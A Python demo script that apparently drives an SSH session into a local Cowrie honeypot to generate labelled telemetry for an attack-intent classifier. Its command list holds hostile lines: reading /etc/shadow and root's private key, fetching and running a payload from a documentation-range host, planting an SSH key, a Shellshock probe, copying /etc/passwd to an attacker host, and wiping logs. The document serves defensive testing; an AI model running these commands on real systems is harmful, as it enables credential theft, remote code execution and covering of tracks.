#!/usr/bin/env python3
"""
Safe end-to-end demo driver: exercises ALL 10 intent classes through the real
pipeline by driving a genuine SSH session against the isolated Cowrie honeypot.

SECURITY
--------
* Every command below is typed into Cowrie's EMULATED shell. Cowrie is a
  honeypot: it fakes the responses and NOTHING executes on the host or backend.
* Network destinations use RFC-5737 documentation ranges (192.0.2.0/24,
  198.51.100.0/24) which are reserved and route nowhere real.
* This script only *generates telemetry*; the backend classifies it. It never
  runs attacker commands itself.

Run (host, against the local stack):
    PYTHONPATH=. .venv/Scripts/python.exe scripts/demo_all_intents.py
"""

import argparse
import sys
import time

import paramiko

# (intent we expect, command typed into the honeypot)
ATTACK_SCRIPT = [
    ("RECONNAISSANCE",       "uname -a"),
    ("RECONNAISSANCE",       "whoami"),
    ("DISCOVERY",            "ls -la /"),
    ("DISCOVERY",            "ps aux"),
    ("DISCOVERY",            "netstat -antp"),
    ("CREDENTIAL_ACCESS",    "cat /etc/shadow"),
    ("CREDENTIAL_ACCESS",    "cat /root/.ssh/id_rsa"),
    ("EXECUTION",            "wget http://192.0.2.10/payload.sh -O /tmp/p.sh; chmod +x /tmp/p.sh; ./p.sh"),
    ("PRIVILEGE_ESCALATION", "sudo su -"),
    ("PRIVILEGE_ESCALATION", "sudo -l"),
    ("PERSISTENCE",          "echo 'ssh-rsa AAAAB3NzaC1yc2Eattacker' >> /root/.ssh/authorized_keys"),
    ("PERSISTENCE",          "crontab -l"),
    ("EXPLOITATION",         "() { :;}; echo VULNERABLE-shellshock"),
    ("EXFILTRATION",         "tar czf /tmp/loot.tar.gz /etc /home"),
    ("EXFILTRATION",         "scp /etc/passwd attacker@198.51.100.20:/loot/"),
    ("CLEANUP",              "history -c"),
    ("CLEANUP",              "rm -rf /var/log/auth.log"),
    ("OTHER",                "echo just testing the shell"),
]


def run(host: str, port: int, username: str, password: str) -> int:
    print(f"[*] Connecting to isolated honeypot {host}:{port} as {username!r} ...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=host, port=port, username=username, password=password,
            timeout=15, allow_agent=False, look_for_keys=False,
        )
    except Exception as exc:  # noqa: BLE001
        print(f"[!] Could not connect to Cowrie: {exc}")
        print("    Is the stack up?  docker compose up -d")
        return 1

    print("[+] Authenticated. Opening interactive shell and driving the attack script.\n")
    chan = client.invoke_shell()
    time.sleep(1.0)
    if chan.recv_ready():
        chan.recv(65535)

    for i, (intent, cmd) in enumerate(ATTACK_SCRIPT, 1):
        print(f"  {i:>2}. [{intent:<20}] $ {cmd}")
        chan.send(cmd + "\n")
        time.sleep(0.6)  # let Cowrie log the command.input event
        if chan.recv_ready():
            chan.recv(65535)

    chan.send("exit\n")
    time.sleep(0.6)
    client.close()
    print(f"\n[+] Sent {len(ATTACK_SCRIPT)} commands across "
          f"{len({i for i, _ in ATTACK_SCRIPT})} intent classes.")
    print("[*] The collector will now ingest cowrie.json -> normalize -> classify "
          "(rule+ML+Gemini) -> risk -> MongoDB.")
    print("[*] Verify with: python scripts/verify_live.py   (or the dashboard at http://127.0.0.1:5173)")
    return 0


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Drive all 10 intents through the honeypot pipeline.")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=2222)
    ap.add_argument("--username", default="root")
    ap.add_argument("--password", default="root")
    args = ap.parse_args()
    sys.exit(run(args.host, args.port, args.username, args.password))
